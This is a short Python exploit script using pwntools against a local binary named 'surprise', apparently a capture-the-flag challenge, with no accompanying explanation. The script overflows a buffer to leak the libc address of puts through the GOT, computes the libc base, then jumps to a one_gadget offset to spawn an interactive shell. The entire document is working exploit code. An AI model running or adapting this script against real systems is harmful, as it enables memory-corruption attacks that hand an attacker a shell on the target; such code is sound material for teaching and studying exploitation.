from pwn import *

elf = ELF("./surprise", checksec=False)
libc = elf.libc
proc = elf.process()
proc.recv()

payload = b"A"*40+p32(elf.got["puts"])

proc.send(payload)
proc.recvuntil(b"(")
PUTS = u64(proc.recv()[:6].ljust(8 ,b"\x00"))
proc.clean()
log.info("PUTS: "+ hex(PUTS))
libc.address = PUTS - libc.sym['puts']
log.info("Libc base: "+ hex(libc.address))
proc.send(p64(libc.address + 0xe6c81))
proc.clean()
proc.interactive()
